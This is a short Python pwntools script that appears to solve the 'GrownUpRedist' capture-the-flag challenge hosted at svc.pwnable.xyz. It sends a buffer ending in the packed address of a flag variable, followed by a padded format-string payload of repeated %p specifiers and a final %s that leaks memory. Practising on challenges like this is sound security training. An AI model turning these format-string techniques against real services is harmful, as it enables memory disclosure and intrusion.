from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
e = ELF('./GrownUpRedist')
#p = process('./GrownUpRedist')
p = remote('svc.pwnable.xyz',30004)
flag= 0x0000000000601080

p.sendafter(':','Y'*8 + p64(flag))

payload = 'AAAAAAAA'
payload += '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %s'
payload += 'A' * (0x80 - len(payload))
# print len(payload)
p.sendlineafter(':',payload)

p.interactive()